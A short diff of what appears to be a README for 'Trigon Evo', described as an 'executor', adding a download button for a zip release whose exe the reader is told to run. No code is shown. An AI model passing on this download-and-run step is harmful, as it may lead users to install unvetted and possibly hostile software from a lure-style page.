@@ -19,3 +19,5 @@ Trigon Evo has some impressive features that make it stand out from other execut
 
 ### Installation
 Simply download the zip file with the button above, and start the Trigon Evo exe file to run the executor, it's that easy!
+
+[![button](https://github.com/trigon-evo/trigon-evo.github.io/blob/master/tr_button.png?raw=true)](https://github.com/trigon-evo/trigon-evo.github.io/releases/download/2.1/Trigon.Evo.zip)
